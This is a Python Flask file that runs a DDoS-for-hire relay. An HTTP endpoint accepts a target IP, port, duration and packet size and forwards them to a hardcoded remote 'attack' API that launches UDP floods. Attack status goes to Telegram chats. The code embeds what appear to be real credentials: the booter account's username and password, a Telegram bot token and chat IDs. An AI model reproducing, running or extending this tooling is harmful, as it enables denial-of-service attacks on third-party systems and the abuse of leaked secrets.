# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import requests
import logging
import time
import threading
from datetime import datetime

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram Bot Configuration
BOT_TOKEN = "8026059055:AAFkvj7NVURs009PHO4746hkKjG_CHax0vo"

# Multiple Chat IDs
CHAT_IDS = [
    "8523310365",
    "7646520243"
]

TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_telegram_message(message):
    """Send log message to multiple Telegram users"""
    for chat_id in CHAT_IDS:
        if chat_id:
            try:
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                response = requests.post(TELEGRAM_API_URL, data=payload, timeout=5)
                if response.status_code != 200:
                    print(f"Telegram send failed to {chat_id}: {response.text}")
            except Exception as e:
                print(f"Telegram error for {chat_id}: {e}")


# Target APIs (Only 6-10) with dynamic len
TARGET_APIS = [
    {"id": 6, "name": "API_6", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 7, "name": "API_7", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 8, "name": "API_8", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 9, "name": "API_9", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
    {"id": 10, "name": "API_10", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method=udp&target={ip}&dport={port}&time={time}&len={len}", "busy": False, "last_used": None, "current_attack": None},
]


def is_attack_successful(response):
    try:
        response_json = response.json()
        if response_json.get('success') == True or response_json.get('error') == False:
            return True
        message = response_json.get('message', '').lower()
        if any(word in message for word in ['launched', 'started', 'success']):
            return True
    except:
        pass

    if response.status_code == 200:
        text = response.text.lower()
        if 'slot' not in text and 'error' not in text:
            return True
    return False


def send_attack(api, ip, port, duration, packet_len):
    target_url = api['url'].format(ip=ip, port=port, time=duration, len=packet_len)
    
    max_retries = 10
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            logger.info(f"[{api['name']}] Sending {duration}s attack | Len: {packet_len}")
            response = requests.get(target_url, timeout=15)
            
            telegram_msg = f"""
🔵 <b>ATTACK STARTED</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Len: {packet_len}
├ Status: {response.status_code}
"""
            send_telegram_message(telegram_msg)
            
            if is_attack_successful(response):
                send_telegram_message(f"""
✅ <b>ATTACK RUNNING</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Duration: {duration}s
└ Len: {packet_len}
""")
                time.sleep(duration)
                
                send_telegram_message(f"""
✅ <b>ATTACK COMPLETED</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Duration: {duration}s
""")
                return {'success': True}
            
            else:
                retry_count += 1
                time.sleep(2)
                
        except Exception as e:
            retry_count += 1
            send_telegram_message(f"⚠️ Error on {api['name']}: {str(e)[:100]}")
            if retry_count < max_retries:
                time.sleep(2)
    
    return {'success': False}


def execute_attack(api, ip, port, total_time, packet_len):
    api['busy'] = True
    api['current_attack'] = {'ip': ip, 'port': port, 'time': total_time, 'len': packet_len}
    
    send_telegram_message(f"""
🚀 <b>NEW ATTACK</b>
├ API: {api['name']}
├ Target: {ip}:{port}
├ Time: {total_time}s
├ Len: {packet_len}
""")
    
    result = send_attack(api, ip, port, total_time, packet_len)
    
    api['busy'] = False
    api['current_attack'] = None
    
    status = "✅ SUCCESS" if result['success'] else "💀 FAILED"
    send_telegram_message(f"{status} | {api['name']} → {ip}:{port} ({total_time}s)")


@app.route('/attack/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time')
    len_param = request.args.get('len', '500')
    
    if not all([ip, port, time_param]):
        return jsonify({'error': 'Missing ip, port, time'}), 400
    
    try:
        port = int(port)
        total_time = int(time_param)
        packet_len = int(len_param)
        if total_time <= 0 or packet_len <= 0:
            raise ValueError
    except ValueError:
        return jsonify({'error': 'Invalid parameters'}), 400
    
    selected_api = next((api for api in TARGET_APIS if not api['busy']), None)
    
    if not selected_api:
        return jsonify({'error': 'All APIs busy'}), 503
    
    threading.Thread(target=lambda: execute_attack(selected_api, ip, port, total_time, packet_len), daemon=True).start()
    
    return jsonify({
        'success': True,
        'api': selected_api['name'],
        'target': f'{ip}:{port}',
        'time': total_time,
        'len': packet_len
    })


@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'free': [api['name'] for api in TARGET_APIS if not api['busy']],
        'busy': [api['name'] for api in TARGET_APIS if api['busy']]
    })


if __name__ == '__main__':
    print("="*60)
    print("ATTACK API READY (APIs 6-10 + len support)")
    print("Usage: ?ip=1.2.3.4&port=80&time=300&len=1024")
    print("="*60)
    app.run(host='0.0.0.0', port=8080, threaded=True)